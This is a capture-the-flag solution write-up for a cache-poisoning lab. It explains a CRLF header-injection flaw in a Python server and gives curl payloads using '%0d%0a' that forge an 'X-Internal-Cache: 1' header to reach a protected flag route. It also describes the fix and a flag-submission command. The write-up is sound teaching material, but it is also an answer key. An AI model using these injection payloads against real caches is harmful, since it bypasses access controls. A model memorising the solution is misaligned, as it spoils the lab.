# w16 Cache Poison :: solution

## Root cause

`app/server.py`, `preview_headers()`:

```python
def preview_headers(forwarded_host, name):
    return (
        "HTTP/1.1 200 OK\r\n"
        f"X-Cache-Key: {forwarded_host}/page/{name}\r\n"
        f"X-Preview-Node: {SERVICE}/{VERSION}\r\n"
        "content-type: text/html; charset=utf-8\r\n"
    )
```

`name` comes from the URL, is URL-decoded in `_preview()` with no validation,
and is **concatenated directly into the response header block**. The `\r\n` that
terminates the `X-Cache-Key` line is supplied by the same string concatenation,
so a `\r\n` inside `name` ends the line early. Everything the attacker writes
after it is parsed as further response headers:

```
X-Cache-Key: localhost/page/x
X-Internal-Cache: 1        <-- injected header line
X-Preview-Node: cache-poison/1.16.0
```

The node then reaches its own trust decision by parsing back the block it just
wrote:

```python
fields = dict(parse_header_block(entry["headers"].decode("latin-1")))
internal = fields.get(INTERNAL_MARKER.lower()) == "1"
```

So writing `X-Internal-Cache: 1` into a cached representation is enough to make
that entry count as internal on every later request. The guard itself is
correct — `/admin/flag` checks `self.headers.get("X-Internal-Cache") == "1"` and
a direct request is refused — but the edge has no way to strip a header that the
attacker injected *server-side*, into the cache.

Two things stack to make this exploitable in one step:

1. **The reflection point is post-parse.** The value is URL-decoded from the
   query string, so `%0d%0a` becomes a genuine CRLF that nothing sanitises. This
   is why the payload goes in the query and not in a request header.
2. **The cached object is the whole header block.** The injection is stored, not
   just reflected, so the second request is a cache HIT that replays the
   poisoned bytes.

## Recon

Confirm the node is alive and see the cache policy:

```bash
curl -s http://localhost:30016/api/health
# {"service":"cache-poison","lab":"w16","version":"1.16.0","cache_slots":0, ...}
```

Read the policy on the landing page. Two facts matter: the cache key is the URL
alone, and `X-Internal-Cache` is "stripped at the edge". Confirm the guard is
genuinely live before you try to beat it — a direct hit is refused, so you know
the route exists and is protected:

```bash
curl -s http://localhost:30016/admin/flag
# {"error": "forbidden", "need": "X-Internal-Cache"}
```

Now confirm the value reaches the header unescaped, with a plain name:

```bash
curl -s -D - -o /dev/null --path-as-is 'http://localhost:30016/page?name=hello'
# X-Cache-Key: localhost/page/hello
```

## Exploit

Two requests to the **same URL**. The first poisons and fills the cache; the
second is a HIT that the node now treats as internal.

```bash
# 1. poison the cached representation
curl -s -o /dev/null --path-as-is \
  'http://localhost:30016/page?name=x%0d%0aX-Internal-Cache:%201'

# 2. read the poisoned URL back
curl -s --path-as-is \
  'http://localhost:30016/page?name=x%0d%0aX-Internal-Cache:%201'
```

The first response already shows the split — curl parses the injected line as a
header of its own:

```bash
curl -s -D - -o /dev/null --path-as-is \
  'http://localhost:30016/page?name=x%0d%0aX-Internal-Cache:%201'
# HTTP/1.1 200 OK
# X-Cache-Key: localhost/page/x
# X-Internal-Cache: 1
# X-Preview-Node: cache-poison/1.16.0
```

The second request returns the internal representation:

```html
<h1>internal preview</h1><p>cache entry treated as internal.</p>
<pre>hex4b0t{...}</pre>
```

Or just run the bundled script:

```bash
bash solution/exploit.sh
# [+] flag: hex4b0t{verifytest123456}
```

`--path-as-is` matters: without it curl may normalise the request target before
sending, and the encoded CRLF is the payload. In practice curl preserves the
`%0d%0a` as written, but the flag keeps the intent explicit.

## Why %0d%0a and not %0a

This is the part that is easy to get wrong, so it was tested directly against
`python:3.12-alpine` rather than assumed.

**The `\r\n` must arrive after HTTP request parsing, or it never survives.**
`http.server` parses requests with `email.parser`'s HTTP policy, which treats
*both* `\r\n` and a bare `\n` as a header-line terminator. A header sent as:

```
X-Forwarded-Host: evil\r\nX-Internal-Cache: 1\r\n
```

is parsed as **two** request headers, and the value reflected into the response
is simply `evil`. The injected text never reaches a reflection point. The same
happens with a bare `\n`. (The one folding trick that does survive header
parsing — RFC 5322 obs-fold, where a continuation line begins with a space or
tab — always leaves that leading whitespace character inside the value, so the
injected wire line is ` X-Internal-Cache: 1`, which downstream parsers treat as a
continuation of `X-Cache-Key` rather than a header of its own. That is useless
for forging a trusted header.)

The query string is decoded *after* the request line and headers have been
parsed. `%0d%0a` therefore becomes a raw `\r\n` at a point where nothing has any
reason to strip it, and the reflection is a clean, WSP-free header line. That is
why the payload rides in `?name=` and not in a request header, and why the
encoded form is `%0d%0a`: it is the one encoding that reaches the vulnerable
concatenation intact.

### A note on `send_header`

Before relying on the hand-rolled writer, the obvious question was whether
`BaseHTTPRequestHandler.send_header` sanitises CRLF in Python 3.12, and the
answer is **no**. Tested inside `python:3.12-alpine` (3.12.14):

```python
def send_header(self, keyword, value):
    if self.request_version != 'HTTP/0.9':
        if not hasattr(self, '_headers_buffer'):
            self._headers_buffer = []
        self._headers_buffer.append(
            ("%s: %s\r\n" % (keyword, value)).encode('latin-1', 'strict'))
    ...
```

It interpolates the value verbatim; the only failure mode it has is a
`UnicodeEncodeError` for a value that is not latin-1 encodable. A CRLF in the
value passes straight through. `send_header` **is** vulnerable here.

The node nevertheless writes its response by hand:

```python
head = f"HTTP/1.1 {status}\r\n{extra_headers}"
head += f"content-length: {len(body)}\r\n"
head += "connection: close\r\n\r\n"
self.wfile.write(head.encode("latin-1", "replace") + body)
```

with this comment on `_write_raw()`:

```python
# ponytail: hand-rolled response, +0 ms off the framework path. The node
# caches and replays *raw header bytes*, so it cannot use send_header /
# end_headers - those buffer through the framework's header list and would
# re-encode what it wants to store verbatim. Building the block as a string
# and writing the bytes is the whole point of the design.
```

That is the in-fiction reason (a cache that stores and replays raw header bytes),
and it is also what makes the injection unambiguous: the vulnerable line is a
plain f-string concatenation with no framework behaviour to reason about. Both
paths were tested in the container and both inject; this one was chosen so the
lab does not depend on a framework detail that could change between patch
releases.

## The fix

There are two layers, and both are load-bearing:

1. **Reject or strip CR/LF in every value that lands in a header.** A cache key
   drawn from a request must be validated at its trust boundary:

   ```python
   if any(c in name for c in ("\r", "\n", "\0")):
       return self._json(400, {"error": "invalid cache key"})
   ```

   Escaping is the wrong fix — a newline in a cache key is meaningless, so the
   request should be refused, not repaired.

2. **Never concatenate untrusted data into the status line or headers.** Use the
   framework's header-setting API, which owns the framing, and let it frame the
   value; if you must emit raw bytes, encode from a structure
   (`[(k, v), ...]`) and have one writer that owns the CRLF placement, so no
   value can ever supply its own. The reflection here also has no reason to
   exist: a cache key belongs in a log or an internal lookup, not on the wire.

The deeper bug is the trust model. A header the edge strips is not a trust
boundary — the *cache* wrote it, so the origin trusts its own output without
re-checking where the bytes came from. The internal marker should be a signed
token or an authenticated internal channel, never a bare header that is merely
"supposed to be stripped".

## Flag

Injected at runtime into `W0B_FLAG`. There is no static value to hardcode, and
the cache is per-process, so it starts empty on every boot.

## Submit

```bash
./manage.sh submit 'hex4b0t{...}' ai-pilot
```
